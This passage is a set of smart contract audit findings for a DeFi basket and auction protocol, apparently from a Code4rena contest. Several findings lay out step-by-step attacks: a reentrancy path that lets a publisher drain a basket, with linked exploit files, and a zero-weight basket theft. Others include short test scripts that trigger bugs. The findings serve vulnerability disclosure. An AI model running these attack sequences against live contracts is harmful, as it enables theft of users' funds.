Given the `auctionBurn()` function will `_burn()` the auction bond without updating the `ibRatio`. Once the bond of a failed auction is burned, the proportional underlying tokens won't be able to be withdrawn, in other words, being frozen in the contract.

#### Proof of Concept

With the configuration of:

basket.ibRatio = 1e18
factory.bondPercentDiv = 400
basket.totalSupply = 400
basket.tokens = \[BTC, ETH]
basket.weights = \[1, 1]

1.  Create an auction;
2.  Bond with 1 BASKET TOKEN;
3.  Wait for 24 hrs and call `auctionBurn()`;

`basket.ibRatio` remains to be 1e18; basket.totalSupply = 399.

Burn 1 BASKET TOKEN will only get back 1 BTC and 1 ETH, which means, there are 1 BTC and 1 ETH frozen in the contract.

#### Recommended Mitigation Steps

Change to:

```solidity
function auctionBurn(uint256 amount) onlyAuction external override {
    handleFees();
    uint256 startSupply = totalSupply();
    _burn(msg.sender, amount);

    uint256 newIbRatio = ibRatio * startSupply / (startSupply - amount);
    ibRatio = newIbRatio;

    emit NewIBRatio(newIbRatio);
    emit Burned(msg.sender, amount);
}
```"
36.md,"Reentrancy in settleAuction(): malicious publisher can bypass index timelock mechanism, inject malicious index, and rug the basket",high,"The `settleAuction()` function calls `withdrawBounty()` before setting `auctionOngoing = false`, thereby allowing reentrancy.

#### Impact

A malicious publisher can bypass the index timelock mechanism and publish new index which the basket's users won't have time to respond to.
At worst case, this means setting weights that allow the publisher to withdraw all the basket's underlying funds for himself, under the guise of a valid new index.

#### Proof of Concept

1.  The publisher (a contract) will propose new valid index and bond the auction.

    To settle the auction, the publisher will execute the following steps in the same transaction:

2. Add a bounty of an ERC20 contract with a malicious `transfer()` function.

3. Settle the valid new weights correctly (using `settleAuction()` with the correct parameters, and passing the malicious bounty id).

4. `settleAuction()` will call `withdrawBounty()` which upon transfer will call the publisher's malicious ERC20 contract.

5. The contract will call `settleAuction()` again, with empty parameters. Since the previous call's effects have already set all the requirements to be met, `settleAuction()` will finish correctly and call `setNewWeights()` which will set the new valid weights and set `pendingWeights.pending = false`.

6. Still inside the malicious ERC20 contract transfer function, the attacker will now call the basket's `publishNewIndex()`, with weights that will transfer all the funds to him upon his burning of shares. This call will succeed to set new pending weights as the previous step set `pendingWeights.pending = false`.

7. Now the malicious `withdrawBounty()` has ended, and the original `settleAuction()` is resuming, but now with malicious weights in `pendingWeights` (set in step 6). `settleAuction()` will now call `setNewWeights()` which will set the basket's weights to be the malicious pending weights.

8. Now `settleAuction` has finished, and the publisher (within the same transaction) will `burn()` all his shares of the basket, thereby transferring all the tokens to himself.

POC exploit:
Password to both files: ""exploit"".
AttackPublisher.sol , to be put under contracts/contracts/Exploit: <https://pastebin.com/efHZjstS>
ExploitPublisher.test.js , to be put under contracts/test: <https://pastebin.com/knBtcWkk>

#### Tools Used

Manual analysis, hardhat.

#### Recommended Mitigation Steps

In `settleAuction()`, move `basketAsERC20.transfer()` and `withdrawBounty()` to the end of the function, conforming with Checks Effects Interactions pattern."
36.md,Use safeTransfer instead of transfer,medium,"<https://github.com/code-423n4/2021-09-defiProtocol/blob/main/contracts/contracts/Auction.sol#L146>

`transfer()` might return false instead of reverting, in this case, ignoring return value leads to considering it successful.

use `safeTransfer()` or check the return value if length of returned data is > 0."
36.md,Fee on transfer tokens can lead to incorrect approval,medium,"#### Fee on transfer tokens can lead to incorrect approval

The
[createBasket](https://github.com/code-423n4/2021-09-defiProtocol/blob/main/contracts/contracts/Factory.sol#L106)
function does not account for tokens with fee on transfer.

```solidity
function createBasket(uint256 idNumber) external override returns (IBasket) {
    // ...
    for (uint256 i = 0; i < bProposal.weights.length; i++) {
        IERC20 token = IERC20(bProposal.tokens[i]);
        token.safeTransferFrom(msg.sender, address(this), bProposal.weights[i]);
        token.safeApprove(address(newBasket), bProposal.weights[i]);
    }
    // ...
}
```

The function `safeTransferFrom` may not transfer exactly
`bProposal.weights[i]` amount of tokens, for tokens with a fee on
transfer. This means that the `safeApprove` call in the next line would
be approving more tokens than what was received, leading to accounting
issues.

##### Recommended Mitigation Steps

It is recommended to find the balance of the current contract before and
after the `transferFrom` to see how much tokens were received, and
approve only what was received."
36.md,`onlyOwner` Role Can Unintentionally Influence `settleAuction()`,medium,"#### Impact

The `onlyOwner` role is able to make changes to the protocol with an immediate affect, while other changes made in `Basket.sol` and `Auction.sol` incur a one day timelock. As a result, an `onlyOwner` role may unintentionally frontrun a `settleAuction()` transaction by making changes to `auctionDecrement` and `auctionMultiplier`, potentially causing the auction bonder to over compensate during a rebalance. Additionally, there is no way for an auction bonder to recover their tokens in the event this does happen.

#### Proof of Concept

- <https://github.com/code-423n4/2021-09-defiProtocol/blob/main/contracts/contracts/Factory.sol#L39-L59>
- <https://github.com/code-423n4/2021-09-defiProtocol/blob/main/contracts/contracts/Auction.sol#L89-L99>

#### Tools Used

Manual code review

#### Recommended Mitigation Steps

Consider adding a timelock delay to all functions affecting protocol execution. Alternatively, `bondForRebalance()` can set state variables for any external calls made to `Factory.sol` (i.e. `factory.auctionMultiplier()` and `factory.auctionDecrement()`), ensuring that `settleAuction()` is called according to these expected results."
36.md,"User can mint miniscule amount of shares, later withdraw miniscule more than deposited",medium,"If a user is minting small amount of shares (like 1 - amount depends on baskets weights), the calculated amount of tokens to pull from the user can be less than 1, and therefore no tokens will be pulled. However the shares would still be minted.
If the user does this a few times, he could then withdraw the total minted shares and end up with more tokens than he started with - although a miniscule amount.

#### Impact

User can end up with more tokens than he started with. However, I didn't find a way for the user to get an amount to make this a feasible attack. He gets dust. However he can still get more than he deserves. If for some reason the basket weights grow in a substantial amount, this could give the user more tokens that he didn't pay for.

#### Proof of Concept

Add the following test to `Basket.test.js`.
The user starts with 5e18 UNI, 1e18 COMP, 1e18 AAVE,
and ends with 5e18+4, 1e18+4, 1e18+4.
```js
it(""should give to user more than he deserves"", async () => {
    await UNI.connect(owner).mint(ethers.BigNumber.from(UNI_WEIGHT).mul(1000000));
    await COMP.connect(owner).mint(ethers.BigNumber.from(COMP_WEIGHT).mul(1000000));
    await AAVE.connect(owner).mint(ethers.BigNumber.from(AAVE_WEIGHT).mul(1000000));

    await UNI.connect(owner).approve(basket.address, ethers.BigNumber.from(UNI_WEIGHT).mul(1000000));
    await COMP.connect(owner).approve(basket.address, ethers.BigNumber.from(COMP_WEIGHT).mul(1000000));
    await AAVE.connect(owner).approve(basket.address, ethers.BigNumber.from(AAVE_WEIGHT).mul(1000000));

    console.log(""User balance before minting:"");
    console.log(""UNI balance: "" + (await UNI.balanceOf(owner.address)).toString());
    console.log(""COMP balance: "" + (await COMP.balanceOf(owner.address)).toString());
    console.log(""AAVE balance: "" + (await AAVE.balanceOf(owner.address)).toString());

    
    await basket.connect(owner).mint(ethers.BigNumber.from(1).div(1));
    await basket.connect(owner).mint(ethers.BigNumber.from(1).div(1));
    await basket.connect(owner).mint(ethers.BigNumber.from(1).div(1));
    await basket.connect(owner).mint(ethers.BigNumber.from(1).div(1));
    await basket.connect(owner).mint(ethers.BigNumber.from(1).div(1));

    console.log(""\nUser balance after minting 1 share 5 times:"");
    console.log(""UNI balance: "" + (await UNI.balanceOf(owner.address)).toString());
    console.log(""COMP balance: "" + (await COMP.balanceOf(owner.address)).toString());
    console.log(""AAVE balance: "" + (await AAVE.balanceOf(owner.address)).toString());

    await basket.connect(owner).burn(await basket.balanceOf(owner.address));
    console.log(""\nUser balance after burning all shares:"");
    console.log(""UNI balance: "" + (await UNI.balanceOf(owner.address)).toString());
    console.log(""COMP balance: "" + (await COMP.balanceOf(owner.address)).toString());
    console.log(""AAVE balance: "" + (await AAVE.balanceOf(owner.address)).toString());
});
```

#### Tools Used

Manual analysis, hardhat.

#### Recommended Mitigation Steps

Add a check to `pullUnderlying`:
```solidity
require(tokenAmount > 0);
```

I think it makes sense that if a user is trying to mint an amount so small that no tokens could be pulled from him, the mint request should be denied.
Per my tests, for an initial ibRatio, this number (the minimal amount of shares that can be minted) is 2 for weights in magnitude of 1e18, and if the weights are eg. smaller by 100, this number will be 101."
36.md,Bonding mechanism allows malicious user to DOS auctions,medium,"A malicious user can listen to the mempool and immediately bond when an auction starts, without aim of settling the auction. As no one can cancel his bond in less than 24h, this will freeze user funds and auction settlement for 24h until his bond is burned and the new index is deleted. The malicious user can then repeat this when a new auction starts.

#### Impact

Denial of service of the auction mechanism. The malicious user can hold the basket ""hostage"" and postpone or prevent implementing new index.
The only way to mitigate it would be to try to front-run the malicious user, obviously not ideal.

#### Proof of Concept

publishAllIndex:
<https://github.com/code-423n4/2021-09-defiProtocol/blob/52b74824c42acbcd64248f68c40128fe3a82caf6/contracts/contracts/Basket.sol#L170>

*   The attacker would listen to this function / PublishedNewIndex event and upon catching it, immediately bond the auction.
*   The publisher has no way to burn a bond before 24h has passed. But even if he could, it would not really help as the attacker could just bond again (though losing funds in the process).

settleAuction:
<https://github.com/code-423n4/2021-09-defiProtocol/blob/52b74824c42acbcd64248f68c40128fe3a82caf6/contracts/contracts/Auction.sol#L79>

*   Only the bonder can settle.

bondBurn:
<https://github.com/code-423n4/2021-09-defiProtocol/blob/52b74824c42acbcd64248f68c40128fe3a82caf6/contracts/contracts/Auction.sol#L111>

*   Can only burn 24h after bond.

#### Tools Used

Manual analysis, hardhat.

#### Recommended Mitigation Steps

If we only allow one user to bond, I see no real way to mitigate this attack, because the malicious user could always listen to the mempool and immediately bond when an auction starts and thus lock it.
So we can change to a mechanism that allows many people to bond and only one to settle;
but at that point, I see no point to the bond mechanism any more. So we might as well remove it and let anybody settle the auction.

With the bond mechanism, a potential settler would have 2 options:

*   Bond early: no one else will be able to bond and settle, but the user would need to leave more tokens in the basket (as newRatio starts large and decreases in time)
*   Bond late: the settler might make more money as he will need to leave less tokens in the basket, but he risks that somebody else will bond and settle before him.

Without a bond mechanism, the potential settler would still have these equivalent 2 options:

*   Settle early: take from basket less tokens, but make sure you win the auction
*   Settle late: take from basket more tokens, but risk that somebody settles before you

So that's really equivalent to the bonding scenario.

I might be missing something but at the moment I see no detriment to removing the bonding mechanism."
36.md,Basket becomes unusable if everybody burns their shares,medium,"While handling the fees, the contract calculates the new `ibRatio` by dividing by `totalSupply`. This can be 0 leading to a division by 0.

#### Impact

If everybody burns their shares, in the next mint, `totalSupply` will be 0, `handleFees` will revert, and so nobody will be able to use the basket anymore.

#### Proof of Concept

Vulnerable line:
<https://github.com/code-423n4/2021-09-defiProtocol/blob/52b74824c42acbcd64248f68c40128fe3a82caf6/contracts/contracts/Basket.sol#L124>
You can add the following test to Basket.test.js and see that it reverts:
```js
it(""should divide by 0"", async () => {
await basket.connect(addr1).burn(await basket.balanceOf(addr1.address));
await basket.connect(addr2).burn(await basket.balanceOf(addr2.address));

    await UNI.connect(addr1).approve(basket.address, ethers.BigNumber.from(1));
    await COMP.connect(addr1).approve(basket.address, ethers.BigNumber.from(1));
    await AAVE.connect(addr1).approve(basket.address, ethers.BigNumber.from(1));
    await basket.connect(addr1).mint(ethers.BigNumber.from(1));
});
```

#### Tools Used

Manual analysis, hardhat.

#### Recommended Mitigation Steps

Add a check to `handleFees`: if `totalSupply= 0`, you can just return, no need to calculate new `ibRatio` / fees.
You might want to reset `ibRatio` to BASE at this point."
36.md,No minimum rate in the auction may break the protocol under network failure,medium,"#### Impact

The aution contract decides a new `ibRatio` in the function `settleAuction`. [Auction.sol#L89-L91](https://github.com/code-423n4/2021-09-defiProtocol/blob/main/contracts/contracts/Auction.sol#L89-L91)

```solidity
uint256 a = factory.auctionMultiplier() * basket.ibRatio();
uint256 b = (bondTimestamp - auctionStart) * BASE / factory.auctionDecrement();
uint256 newRatio = a - b;
```

There's a chance that `newRatio` would be really close to zero. This imposes too much risk on the protocol. The network may not really be healthy all the time. Solana and Arbitrum were down and Ethereum was suffered a forking issue recently. Also, the network may be jammed from time to time. This could cause huge damage to a protocol. Please refer to [Black Thursday for makerdao 8.32 million was liquidated for 0 dai](https://medium.com/@whiterabbit_hq/black-thursday-for-makerdao-8-32-million-was-liquidated-for-0-dai-36b83cac56b6)

Given the chance that all user may lose their money, I consider this is a medium-risk issue.

#### Proof of Concept

[Black Thursfay for makerdao 8.32 million was liquidated for 0 dai](https://medium.com/@whiterabbit_hq/black-thursday-for-makerdao-8-32-million-was-liquidated-for-0-dai-36b83cac56b6)
[bug-impacting-over-50-of-ethereum-clients-leads-to-fork](https://www.theblockcrypto.com/post/115822/bug-impacting-over-50-of-ethereum-clients-leads-to-fork)

#### Tools Used

None

#### Recommended Mitigation Steps

I recommend setting a minimum `ibRatio` when a publisher publishes a new index. The auction should be killed if the `ibRatio` is too low."
36.md,settleAuction may be impossible if locked at a wrong time.,medium,"#### Impact

The auction contract decides a new `ibRatio` in the function `settleAuction`. [Auction.sol#L89-L91](https://github.com/code-423n4/2021-09-defiProtocol/blob/main/contracts/contracts/Auction.sol#L89-L91)

```solidity
uint256 a = factory.auctionMultiplier() * basket.ibRatio();
uint256 b = (bondTimestamp - auctionStart) * BASE / factory.auctionDecrement();
uint256 newRatio = a - b;
```

In this equation, `a` would not always be greater than `b`. The `  auctionBonder ` may lock the token in `bondForRebalance()` at a point that `a-b` would always revert.

The contract should not allow users to lock the token at the point that not gonna succeed. Given the possible (huge) loss of the user may suffer, I consider this is a medium-risk issue.

#### Proof of Concept

Here's a web3.py script to trigger this bug.

```python
basket.functions.publishNewIndex([dai.address], [deposit_amount]).transact()

for i in range(4 * 60 * 24):
    w3.provider.make_request('evm_mine', [])
basket.functions.publishNewIndex([dai.address], [deposit_amount]).transact()

print('auction on going', auction.functions.auctionOngoing().call())
for i in range(20000):
    w3.provider.make_request('evm_mine', [])

all_token = basket.functions.balanceOf(user).call()
basket.functions.approve(auction.address, all_token).transact()
auction.functions.bondForRebalance().transact()"
36.md,Fee calculation is potentially incorrect,medium,"#### Impact

More fees are actually charged than intended

#### Mitigation Steps

[Basket.sol line 118](https://github.com/code-423n4/2021-09-defiProtocol/blob/main/contracts/contracts/Basket.sol#L118)

Assume that license fee is 10% i.e. 1e17 and time diff = half a year.

When you calculate `feePct`, you expect to get 5e16 since that's 5% and the actual amount of fee to be charged should be totalSupply \* feePct (5) / BASE (100) but on line 118, we are actually dividing by BASE - feePct i.e. 95.

5 / 95 = 0.052 instead of the intended 0.05.

Solution is to replace `BASE - feePct` in the denominator with `BASE`."
36.md,`burn` and `mintTo` in `Basket.sol` vulnerable to reentrancy,medium,"#### Impact

The functions [mintTo](https://github.com/code-423n4/2021-09-defiProtocol/blob/52b74824c42acbcd64248f68c40128fe3a82caf6/contracts/contracts/Basket.sol#L82)
and [burn](https://github.com/code-423n4/2021-09-defiProtocol/blob/52b74824c42acbcd64248f68c40128fe3a82caf6/contracts/contracts/Basket.sol#L96) make external calls prior to updating the state. If a basket contains an ERC777 token, attackers can mint free basket tokens.

#### Proof of Concept

An attacker could reenter the `mintTo` function when the contract pulls an ERC777 token from the user and mint more tokens than they deposited.

#### Tools Used

Slither

#### Recommended Mitigation Steps

Move external calls after state updates. It is best practice to make external calls after updating state in accordance with the check-effect-interact pattern."
36.md,Owner can steal all Basket funds during auction,medium,"#### Impact

The owner of Factory contract can modify the values of `auctionMultiplier` and `auctionDecrement` at any time.
During an auction, these values are used to calculate `newRatio` and thereby `tokensNeeded`: specifically, it's easy to set the factory parameters so that `tokensNeeded = 0` (or close to zero) for every token.
This way the owner can participate at an auction, change the parameters, and get the underlying tokens from a Basket without transferring any pending tokens.

#### Proof of Concept

<https://github.com/code-423n4/2021-09-defiProtocol/blob/main/contracts/contracts/Auction.sol#L89-L99>

#### Tools Used

editor

#### Recommended Mitigation Steps

Consider adding a Timelock to these Factory functions. Otherwise a way to not modify them if an auction is ongoing (maybe Auction saves the values it reads when `startAuction` is called)."
36.md,Factory.sol - lack of checks in `setAuctionDecrement` will cause reverts in Auction::settleAuction(),medium,"#### Impact

`setAuctionDecrement` doesn't check for a min nor a max amount
This means we can change `auctionDecrement` which would allow `owner` to set `auctionDecrement` to 0

This will cause the function `settleAuction` in Auction.sol to revert

This allows the owner to block auctions from being settled

#### Proof of Concept

`setAuctionDecrement(0)`
Now `settleAuction` will revert due to division by 0

#### Recommended Mitigation Steps

Add checks in `setAuctionDecrement`
Refactor to
```solidity
function setAuctionDecrement(uint256 newAuctionDecrement) public override onlyOwner {
    require(newAuctionDecrement > AMOUNT);
    require(newAuctionDecrement <= AMOUNT\_2);
    auctionDecrement = newAuctionDecrement;
}
```"
36.md,lack of checks in `Factory::setBondPercentDiv` allow owner to prevent bonding in Auction::bondForRebalance(),medium,"#### Impact

`setBondPercentDiv` has no checks for min and max

Setting `bondPercentDiv` to 0 will cause `Auction::bondForRebalance()` to revert

This allows the owner to prevent bonding by setting the `bondPercentDiv` to 0

#### Recommended Mitigation Steps

Refactor to

```solidity
function setBondPercentDiv(uint256 newBondPercentDiv) public override onlyOwner {
    require(newBondPercentDiv > AMOUNT);
    require(newBondPercentDiv <= AMOUNT_2);
    bondPercentDiv = newBondPercentDiv;
}
```"
36.md,`Basket.sol#handleFees()` could potentially cause disruption of minting and burning,medium,"<https://github.com/code-423n4/2021-09-defiProtocol/blob/main/contracts/contracts/Basket.sol#L110-L129>

```solidity
function handleFees() private {
    if (lastFee == 0) {
        lastFee = block.timestamp;
    } else {
        uint256 startSupply = totalSupply();

        uint256 timeDiff = (block.timestamp - lastFee);
        uint256 feePct = timeDiff * licenseFee / ONE_YEAR;
        uint256 fee = startSupply * feePct / (BASE - feePct);

        _mint(publisher, fee * (BASE - factory.ownerSplit()) / BASE);
        _mint(Ownable(address(factory)).owner(), fee * factory.ownerSplit() / BASE);
        lastFee = block.timestamp;

        uint256 newIbRatio = ibRatio * startSupply / totalSupply();
        ibRatio = newIbRatio;

        emit NewIBRatio(ibRatio);
    }
}
```

`timeDiff * licenseFee` can be greater than `ONE_YEAR` when `timeDiff` and/or `licenseFee` is large enough, which makes `feePct` to be greater than `BASE` so that `BASE - feePct` will revert on underflow.

#### Impact

Minting and burning of the basket token are being disrupted until the publisher update the `licenseFee`.

#### Proof of Concept

1.  Create a basket with a `licenseFee` of `1e19` or 1000% per year and mint 1 basket token;
2.  The basket remain inactive (not being minted or burned) for 2 months;
3.  Calling `mint` and `burn` reverts at `handleFees()`.

#### Recommended Mitigation Steps

Limit the max value of `feePct`."
36.md,"`Auction.sol#settleAuction()` late auction bond could potentially not being able to be settled, cause funds loss to bonder",medium,"The `newRatio` that determines `tokensNeeded` to settle the auction is calculated based on `auctionMultiplier`, `bondTimestamp - auctionStart` and `auctionDecrement`.

```solidity
uint256 a = factory.auctionMultiplier() * basket.ibRatio();
uint256 b = (bondTimestamp - auctionStart) * BASE / factory.auctionDecrement();
uint256 newRatio = a - b;
```

However, if an auction is bonded late (`bondTimestamp - auctionStart` is a large number), and/or the `auctionMultiplier` is small enough, and/or the `auctionDecrement` is small enough, that makes `b` to be greater than `a`, so that `uint256 newRatio = a - b;` will revert on underflow.

This might seem to be an edge case issue, but considering that a rebalance auction of a bag of shitcoin to high-value tokens might just end up being bonded at the last minute, with a `newRatio` near zero. When we take the time between the bonder submits the transaction and it got packed into a block, it's quite possible that the final `bondTimestamp` gets large enough to revet `a - b`.

##### Impact

An auction successfully bonded by a regular user won't be able to be settled, and the user will lose the bond.

##### Proof of Concept

With the configuration of:

basket.ibRatio = 1e18
factory.auctionDecrement = 5760 (Blocks per day)
factory.auctionMultiplier = 2

1.  Create an auction;
2.  The auction remain inactive (not get bonded) for more than 2 days (>11,520 blocks);
3.  Call `bondForRebalance()` and it will succeed;
4.  Calling `settleAuction()` will always revert.

##### Recommended Mitigation Steps

Calculate and require `newRatio > 0` in `bondForRebalance()`, or limit the max value of decrement and make sure newRatio always > 0 in `settleAuction()`."
36.md,`Auction.sol#settleAuction()` Mishandling bounty state could potentially disrupt `settleAuction()`,medium,"<https://github.com/code-423n4/2021-09-defiProtocol/blob/main/contracts/contracts/Auction.sol#L143>

```solidity
function withdrawBounty(uint256[] memory bountyIds) internal {
    // withdraw bounties
    for (uint256 i = 0; i < bountyIds.length; i++) {
        Bounty memory bounty = _bounties[bountyIds[i]];
        require(bounty.active);

        IERC20(bounty.token).transfer(msg.sender, bounty.amount);
        bounty.active = false;

        emit BountyClaimed(msg.sender, bounty.token, bounty.amount, bountyIds[i]);
    }
}
```

In the `withdrawBounty` function, `bounty.active` should be set to `false` when the bounty is claimed.

However, since `bounty` is stored in memory, the state update will not succeed.

##### Impact

An auction successfully bonded by a regular user won't be able to be settled if they passed seemly active bountyIds, and the bonder will lose the bond.

##### Proof of Concept

1.  Create an auction;
2.  Add a bounty;
3.  Auction settled with bounty claimed;
4.  Create a new auction;
5.  Add a new bounty;
6.  Calling `settleAuction()` with the bountyIds of the 2 seemly active bounties always reverts.

##### Recommended Mitigation Steps

Change to:

```solidity
Bounty storage bounty = _bounties[bountyIds[i]];
```

[frank-beard (Kuiper) confirmed and marked as duplicate](https://github.com/code-423n4/2021-09-defiprotocol-findings/issues/136#issuecomment-936623596):**
 > duplicate of https://github.com/code-423n4/2021-09-defiprotocol-findings/issues/168"
36.md,Unsafe approve would halt the auction and burn the bond,medium,"#### Impact

[Basket.sol#L224-L228](https://github.com/code-423n4/2021-09-defiProtocol/blob/main/contracts/contracts/Basket.sol#L224-L228) calls approve that do not handle non-standard erc20 behavior.

1.  Some token contracts do not return any value.
2.  Some token contracts revert the transaction when the allowance is not zero.

Since the auction contract calls `setNewWeights` in function `settleAuction`, `auctionBonder` may lock its bond and never successfully settles the auction. This leads to the `auctionBonder` loss he's bond and the basket and the auction becomes suspended.

`auctionBonder` would lose his bond and the contract would be suspended. I consider this a high-risk issue.

#### Proof of Concept

USDT may be a classic non-standard erc20 token.

Here's a short POC.

```python
usdt.functions.approve(basket.address, 100).transact()
## the second tx would be reverted as the allowance is not zero
usdt.functions.approve(basket.address, 50).transact()
```

#### Tools Used

None

#### Recommended Mitigation Steps

Recommend to use `safeApprove` instead and set the allowance to 0 before calling it.

```solidity
function approveUnderlying(address spender) private {
    for (uint256 i = 0; i < weights.length; i++) {
        IERC20(tokens[i]).safeApprove(spender, 0);
        IERC20(tokens[i]).safeApprove(spender, type(uint256).max);
    }
}
```"
36.md,licenseFee can be greater than BASE,medium,"#### Impact

Worst case - no functions that contains `handleFees()` can pass because [line 118](https://github.com/code-423n4/2021-09-defiProtocol/blob/main/contracts/contracts/Basket.sol#L118) will always underflow and revert. You only need `feePct` to be bigger than `BASE` for the `handleFees()` function to fail which will result in a lot of gas wasted and potentially bond burnt.

I did not classify this as high risk because a simple fix would be to simply reduce the licenseFee via `changeLicenseFee`.

#### Recommended Mitigation Steps

Add these require statement to the following functions:

*   Basket.changeLicenseFee()
    *   `require(newLicenseFee <= BASE, ""changeLicenseFee: license fee cannot be greater than 100%"");`
*   Factory.proposeBasketLicense()
    *   `require(licenseFee <= BASE, ""proposeBasketLicense: license fee cannot be greater than 100%"");`"
36.md,Scoop ERC20 tokens from basket contract,medium,"#### Impact

Suppose some unrelated ERC20 tokens end up in the basket contract  (via an airdrop, a user mistake etc)

Then anyone can do a `bondForRebalance()` and `settleAuction()` to scoop these tokens.

The function `settleAuction()` allows you to specify an outputToken, so also completely unrelated tokens.
Thus you can retrieve additional tokens with  `settleAuction()`

#### Proof of Concept

<https://github.com/code-423n4/2021-09-defiProtocol/blob/main/contracts/contracts/Auction.sol#L69>
function settleAuction(..  address\[] memory outputTokens, uint256\[] memory outputWeights) public override {
...
for (uint256 i = 0; i < outputTokens.length; i++) {
IERC20(outputTokens\[i]).safeTransferFrom(address(basket), msg.sender, outputWeights\[i]);
}

#### Recommended Mitigation Steps

Check outputTokens are part of the previous basket tokens  (e.g. `basket.tokens()` )"
36.md,Auction multiplier set to zero,medium,"#### Impact
```solidity
function setAuctionMultiplier(uint256 newAuctionMultiplier) public override onlyOwner {
    auctionMultiplier = newAuctionMultiplier;
}
```

auction multiplier can be set to zero by factory owner. This would stop the auction settling, function would always revert.
```solidity
uint256 a = factory.auctionMultiplier() * basket.ibRatio();
    uint256 b = (bondTimestamp - auctionStart) * BASE / factory.auctionDecrement();
    uint256 newRatio = a - b;
```

causing a safe math error and `newRatio` to revert.

#### Proof of Concept

Provide direct links to all referenced code in GitHub. Add screenshots, logs, or any other relevant proof that illustrates the concept.

#### Recommended Mitigation Steps"
36.md,Zero weighted baskets are allowed to steal funds,medium,"#### Impact

It was observed that Publisher is allowed to create a basket with zero token and weight. This can lead to user fund stealing as described in below poc
The issue was discovered in `validateWeights` function of Basket contract

#### Proof of Concept

1.  User proposes a new Basket with 0 tokens and weights using `proposeBasketLicense` function in Factory contract

```solidity
Proposal memory proposal = Proposal({
        licenseFee: 10,
        tokenName: abc,
        tokenSymbol: aa,
        proposer: 0xabc,
        tokens: {},
        weights: {},
        basket: address(0)
});
```

2.  `validateWeights` function is called and it returns success as the only check performed is `\_tokens.length == \_weights.length (0=0)`

```solidity
function validateWeights(address[] memory _tokens, uint256[] memory _weights) public override pure {
    require(_tokens.length == _weights.length);
    uint256 length = _tokens.length;
    address[] memory tokenList = new address[](length);

    // check uniqueness of tokens and not token(0)

    for (uint i = 0; i < length; i++) {
        ...
    }
}
```

3.  A new proposal gets created
```solidity
   _proposals.push(proposal);
```

4.  User creates new Basket with this proposal using `createBasket` function

```solidity
function createBasket(uint256 idNumber) external override returns (IBasket) {
    Proposal memory bProposal = _proposals[idNumber];
    require(bProposal.basket == address(0));

    ....

    for (uint256 i = 0; i < bProposal.weights.length; i++) {
        ...
    }
    ...
    return newBasket;
}
```

5.  Since no weights and tokens were in this proposal so no token transfer is required (`bProposal.weights.length` will be 0 so loop won't run)

6.  Basket gets created and user becomes publisher for this basket

```solidity
newBasket.mintTo(BASE, msg.sender);
_proposals[idNumber].basket = address(newBasket);
```

7.  Publisher owned address calls the mint function with say amount 10 on `Basket.sol` contract

```solidity
function mint(uint256 amount) public override {
    mintTo(amount, msg.sender);
}

function mintTo(uint256 amount, address to) public override {
    ...

    pullUnderlying(amount, msg.sender);

    _mint(to, amount);

    ...
}
```

8.  Since there is no weights so `pullUnderlying` function does nothing (weights.length is 0)

```solidity
function pullUnderlying(uint256 amount, address from) private {
    for (uint256 i = 0; i < weights.length; i++) {
        uint256 tokenAmount = amount * weights[i] * ibRatio / BASE / BASE;
        IERC20(tokens[i]).safeTransferFrom(from, address(this), tokenAmount);
    }
}
```

9.  Full amount 10 is minted to Publisher owned address setting `balanceOf(msg.sender) = 10`

```solidity
_mint(to, amount);
```

10. Now Publisher calls the `publishNewIndex` to set new weights. Since `pendingWeights.pending` is false, else condition gets executed

```solidity
function publishNewIndex(address[] memory _tokens, uint256[] memory _weights) onlyPublisher public override {
    validateWeights(_tokens, _weights);

    if (pendingWeights.pending) {
        require(block.number >= pendingWeights.block + TIMELOCK_DURATION);
        if (auction.auctionOngoing() == false) {
            auction.startAuction();

            emit PublishedNewIndex(publisher);
        } else if (auction.hasBonded()) {

        } else {
            auction.killAuction();

            pendingWeights.tokens = _tokens;
            pendingWeights.weights = _weights;
            pendingWeights.block = block.number;
        }
    } else {
        pendingWeights.pending = true;
        pendingWeights.tokens = _tokens;
        pendingWeights.weights = _weights;
        pendingWeights.block = block.number;
    }
}
```

11. Publisher calls the `publishNewIndex` again which starts the Auction. This auction is later settled using the `settleAuction` function in Auction contract

12. Publisher owned address can now call burn and get the amount 10 even though he never made the payment since his `balanceOf(msg.sender) = 10` (Step 9)

```solidity
function burn(uint256 amount) public override {
    require(auction.auctionOngoing() == false);
    require(amount > 0);
    require(balanceOf(msg.sender) >= amount);

    handleFees();

    pushUnderlying(amount, msg.sender);
    _burn(msg.sender, amount);
    
    emit Burned(msg.sender, amount);
}
```
#### Recommended Mitigation Steps

Change `validateWeights` to check for 0 length token

```solidity
function validateWeights(address[] memory _tokens, uint256[] memory _weights) public override pure {
    require(_tokens.length>0);
    ...
}
```"
36.md,Incorrect data location specifier can be abused to cause DoS and fund loss,medium,"#### Impact

The `withdrawBounty()` loops through the `\_bounties` array looking for active bounties and transferring amounts from active ones. However, the data location specifier used for bounty is memory which makes a copy of the `\_bounties` array member instead of a reference. So when bounty.active is set to false, this is changing only the memory copy and not the array element of the storage variable. This results in bounties never being set to inactive, keeping them always active forever and every `withdrawBounty()` will attempt to transfer bounty amount from the Auction contract to the msg.sender.

Therefore, while the transfer will work the first time, subsequent attempts to claim this bounty will revert on transfer (because the Auction contract will not have required amount of bounty tokens) causing `withdrawBounty()` to always revert and therefore preventing settling of any auction.

A malicious attacker can add a tiny bounty on any/every Auction contract to prevent any reindexing on that contract to happen because it will always revert on auction settling. This can be used to cause DoS on any `auctionBonder` so as to make them lose their bondAmount because their bonded auction cannot be settled.

#### Proof of Concept

- <https://github.com/code-423n4/2021-09-defiProtocol/blob/52b74824c42acbcd64248f68c40128fe3a82caf6/contracts/contracts/Auction.sol#L143>

- <https://github.com/code-423n4/2021-09-defiProtocol/blob/52b74824c42acbcd64248f68c40128fe3a82caf6/contracts/contracts/Auction.sol#L143-L147>

- <https://docs.soliditylang.org/en/v0.8.7/types.html#data-location-and-assignment-behaviour>

#### Tools Used

Manual Analysis

#### Recommended Mitigation Steps

Recommend changing storage specifier of bounty to ""storage"" instead of “memory""."
36.md,Auction settler can steal user funds if bond timestamp is high enough,medium,"After an auction has started, as time passes and according to the `bondTimestamp`, `newRatio` (which starts at `2\*ibRatio`) gets smaller and smaller and therefore less and less tokens need to remain in the basket.
This is not capped, and after a while, `newRatio` can become smaller than current `ibRatio`.

#### Impact

If for some reason nobody has settled an auction and the publisher didn't stop it, a malicious user can wait until `newRatio < ibRatio`, or even until `newRatio \~= 0` (for an initial `ibRatio` of \~1e18 this happens after less than 3.5 days after auction started), and then bond and settle and steal user funds.

#### Proof of Concept

These are the vulnerable lines:
